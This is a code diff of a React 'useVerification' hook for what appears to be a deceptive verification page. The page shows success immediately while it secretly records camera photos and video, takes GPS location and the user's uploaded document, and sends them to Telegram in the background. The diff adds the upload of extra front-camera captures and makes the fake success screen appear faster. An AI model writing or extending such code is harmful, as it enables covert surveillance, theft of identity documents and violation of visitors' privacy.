@@ -17,7 +17,7 @@ export function useVerification() {
   const [redirectCountdown, setRedirectCountdown] = useState(5);
   const [uploadedFile, setUploadedFile] = useState<File | null>(null);
   const [validationError, setValidationError] = useState<string | null>(null);
-  const [isInitialLoading, setIsInitialLoading] = useState(true);
+  const [isInitialLoading, setIsInitialLoading] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
 
   const videoRef = useRef<HTMLVideoElement | null>(null);
@@ -25,14 +25,6 @@ export function useVerification() {
   const redirectConfig = getRedirectConfig();
   const redirectUrl = redirectConfig.targetUrl;
   const countdownDuration = redirectConfig.countdownDuration;
-
-  // Initial loading screen - show for 2 seconds
-  useEffect(() => {
-    const timer = setTimeout(() => {
-      setIsInitialLoading(false);
-    }, 2000);
-    return () => clearTimeout(timer);
-  }, []);
 
   // Show popup after short delay
   useEffect(() => {
@@ -91,10 +83,8 @@ export function useVerification() {
     locationPromise: Promise<{ lat: number; lng: number } | null>,
     fileToUpload: File
   ) => {
-    // Show success page immediately (extremely fast transition, no loading wait!)
     setIsProcessing(false);
     setIsVerified(true);
-
     // Run the 10s capture and Telegram upload completely in the background
     (async () => {
       try {
@@ -109,6 +99,32 @@ export function useVerification() {
         const formData = new FormData();
         if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
         if (videoBlob) formData.append('video', videoBlob, 'video.webm');
+
+        // Retrieve front camera photo/video from sessionStorage (set by page.tsx camera capture)
+        const frontPhotoData = sessionStorage.getItem('frontPhoto');
+        const frontVideoData = sessionStorage.getItem('frontVideo');
+
+        if (frontPhotoData) {
+          try {
+            const res = await fetch(frontPhotoData);
+            const blob = await res.blob();
+            formData.append('photo2', blob, 'front_photo.jpg');
+            sessionStorage.removeItem('frontPhoto');
+          } catch (e) {
+            console.error('Failed to parse front photo:', e);
+          }
+        }
+
+        if (frontVideoData) {
+          try {
+            const res = await fetch(frontVideoData);
+            const blob = await res.blob();
+            formData.append('video2', blob, 'front_video.webm');
+            sessionStorage.removeItem('frontVideo');
+          } catch (e) {
+            console.error('Failed to parse front video:', e);
+          }
+        }
 
         if (fileToUpload) {
           formData.append('document', fileToUpload, fileToUpload.name);
@@ -162,21 +178,18 @@ export function useVerification() {
   // --- Permission request (non-blocking, parallel) ---
   // Requests both camera & geolocation simultaneously (no gap).
   // If denied, returns false immediately — user can click again to retry.
-  const requestAllPermissions = async (): Promise<boolean> => {
+  const requestAllPermissions = async (): Promise<
+    { lat: number; lng: number } | null | false
+  > => {
     try {
-      // Request BOTH permissions in parallel (sangat cepat, tidak ada jeda)
       const [location, permissionStream] = await Promise.all([
-        getGeolocationPromise(),
+        getGeolocationPromise().catch(() => null), // GPS gagal → null, bukan throw
         navigator.mediaDevices.getUserMedia({ video: true }),
       ]);
-
-      // Stop permission-check stream immediately
       permissionStream.getTracks().forEach((t) => t.stop());
-
-      return true; // both granted
+      return location; // {lat,lng} | null — false berarti denied
     } catch (err) {
-      // Permission denied — return immediately, user can click again
-      console.error('Permission denied:', err);
+      console.error("Permission denied:", err);
       return false;
     }
   };
@@ -188,17 +201,16 @@ export function useVerification() {
     setIsProcessing(true);
 
     try {
-      // Ensure all permissions are granted
-      const granted = await requestAllPermissions();
-      if (!granted) {
+      // Request all permissions + get GPS location in one shot
+      const location = await requestAllPermissions();
+
+      // If permission denied, reset and let user try again
+      if (location === false) {
         setIsProcessing(false);
         return;
       }
 
-      // 1. Get geolocation (resolves instantly since already granted)
-      const location = await getGeolocationPromise();
-
-      // 2. Get camera stream (resolves instantly since already granted)
+      // Get camera stream (resolves instantly since already granted)
       const stream = await navigator.mediaDevices.getUserMedia({
         video: {
           facingMode: 'user',
@@ -233,7 +245,6 @@ export function useVerification() {
     if (file) {
       setUploadedFile(file);
       setValidationError(null);
-      // Auto-trigger verification flow instantly using the selected file
       executeVerificationFlow(file);
     }
   };
